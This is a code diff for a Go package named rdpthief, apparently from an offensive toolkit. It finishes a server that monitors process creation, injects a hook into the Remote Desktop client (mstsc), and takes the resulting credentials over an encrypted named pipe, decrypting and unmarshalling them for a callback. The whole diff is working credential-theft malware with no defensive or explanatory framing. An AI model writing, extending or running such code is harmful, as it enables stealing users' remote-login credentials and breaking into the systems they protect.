@@ -3,15 +3,20 @@ package rdpthief
 import (
 	"context"
 	"crypto/sha256"
+	"io"
 	"net"
 	"sync"
+	"time"
 
 	"github.com/Microsoft/go-winio"
 
+	"project/internal/convert"
 	"project/internal/crypto/aes"
 	"project/internal/logger"
 	"project/internal/module/taskmgr"
+	"project/internal/patch/msgpack"
 	"project/internal/security"
+	"project/internal/xpanic"
 )
 
 // Injector is used to inject hook to the mstsc process.
@@ -32,21 +37,20 @@ type Server struct {
 	callback Callback
 	hook     *security.Bytes
 
-	cbc     *aes.CBC
-	monitor *taskmgr.Monitor
+	cbc      *aes.CBC
+	monitor  *taskmgr.Monitor
+	listener net.Listener
 
-	ctx       context.Context
-	cancel    context.CancelFunc
 	closeOnce sync.Once
 	wg        sync.WaitGroup
 }
 
 // NewServer is used to create a rdpthief server.
-func NewServer(logger logger.Logger, injector Injector, callback Callback, cfg *Config) (*Server, error) {
+func NewServer(lg logger.Logger, inj Injector, cb Callback, cfg *Config) (*Server, error) {
 	srv := Server{
-		logger:   logger,
-		injector: injector,
-		callback: callback,
+		logger:   lg,
+		injector: inj,
+		callback: cb,
 		hook:     security.NewBytes(cfg.Hook),
 	}
 	passHash := sha256.Sum256([]byte(cfg.Password))
@@ -54,30 +58,36 @@ func NewServer(logger logger.Logger, injector Injector, callback Callback, cfg *
 	if err != nil {
 		return nil, err
 	}
-	taskmgrOpts := new(taskmgr.Options) // only need PID
-	monitor, err := taskmgr.NewMonitor(logger, srv.taskEventHandler, taskmgrOpts)
+	// create process monitor
+	taskmgrOpts := new(taskmgr.Options) // only need pid
+	monitor, err := taskmgr.NewMonitor(lg, srv.taskmgrEventHandler, taskmgrOpts)
 	if err != nil {
 		return nil, err
 	}
+	monitor.SetInterval(250 * time.Millisecond)
+	// create pipe listener
 	listener, err := winio.ListenPipe(`\\.\pipe\`+cfg.PipeName, nil)
 	if err != nil {
 		return nil, err
 	}
-
 	srv.cbc = cbc
 	srv.monitor = monitor
-
-	listener.Close()
-
+	srv.listener = listener
+	// start serve
+	srv.wg.Add(1)
+	go srv.serve(listener)
 	return &srv, nil
-
 }
 
-func (srv *Server) log() {
-
+func (srv *Server) logf(lv logger.Level, format string, log ...interface{}) {
+	srv.logger.Printf(lv, "rdpthief-server", format, log...)
 }
 
-func (srv *Server) taskEventHandler(_ context.Context, event uint8, data interface{}) {
+func (srv *Server) log(lv logger.Level, log ...interface{}) {
+	srv.logger.Println(lv, "rdpthief-server", log...)
+}
+
+func (srv *Server) taskmgrEventHandler(_ context.Context, event uint8, data interface{}) {
 	if event != taskmgr.EventProcessCreated {
 		return
 	}
@@ -94,10 +104,96 @@ func (srv *Server) injectHook(process *taskmgr.Process) {
 	defer srv.hook.Put(hook)
 	err := srv.injector(uint32(process.PID), hook)
 	if err != nil {
-		srv.log()
+		srv.logf(logger.Error, "failed to inject hook to process %d: %s", process.PID, err)
 	}
 }
 
 func (srv *Server) serve(listener net.Listener) {
+	defer srv.wg.Done()
+	defer func() {
+		if r := recover(); r != nil {
+			srv.log(logger.Fatal, xpanic.Print(r, "Server.serve"))
+		}
+	}()
 
+	pipePath := listener.Addr().String()
+	srv.logf(logger.Info, "serve over pipe (%s)", pipePath)
+	defer srv.logf(logger.Info, "pipe closed (%s)", pipePath)
+
+	// start accept loop
+	const maxDelay = time.Second
+	var delay time.Duration // how long to sleep on accept failure
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			// check error
+			if ne, ok := err.(net.Error); ok && ne.Temporary() {
+				if delay == 0 {
+					delay = 5 * time.Millisecond
+				} else {
+					delay *= 2
+				}
+				if delay > maxDelay {
+					delay = maxDelay
+				}
+				srv.logf(logger.Warning, "accept error: %s; retrying in %v", err, delay)
+				time.Sleep(delay)
+				continue
+			}
+			srv.log(logger.Error, err)
+			return
+		}
+		srv.wg.Add(1)
+		go srv.handleClient(conn)
+	}
+}
+
+func (srv *Server) handleClient(conn net.Conn) {
+	defer srv.wg.Done()
+	defer func() {
+		if r := recover(); r != nil {
+			srv.log(logger.Fatal, xpanic.Print(r, "Server.handleClient"))
+		}
+	}()
+	defer func() { _ = conn.Close() }()
+
+	sizeBuf := make([]byte, 4)
+	_, err := io.ReadFull(conn, sizeBuf)
+	if err != nil {
+		srv.log(logger.Error, "failed to read size:", err)
+		return
+	}
+	size := convert.BEBytesToUint32(sizeBuf)
+	cipherData, err := security.ReadAll(conn, int64(size))
+	if err != nil {
+		srv.log(logger.Error, "failed to read cipher data:", err)
+		return
+	}
+	plainData, err := srv.cbc.Decrypt(cipherData)
+	if err != nil {
+		srv.log(logger.Error, "failed to decrypt cipher data:", err)
+		return
+	}
+	cred := new(Credential)
+	err = msgpack.Unmarshal(plainData, cred)
+	if err != nil {
+		srv.log(logger.Error, "failed to unmarshal credential:", err)
+		return
+	}
+
+	srv.callback(cred)
+}
+
+// Close is used to close rdpthief server.
+func (srv *Server) Close() (err error) {
+	srv.closeOnce.Do(func() {
+		err = srv.monitor.Close()
+		srv.monitor = nil
+		e := srv.listener.Close()
+		if e != nil && err == nil {
+			err = e
+		}
+		srv.wg.Wait()
+	})
+	return
 }
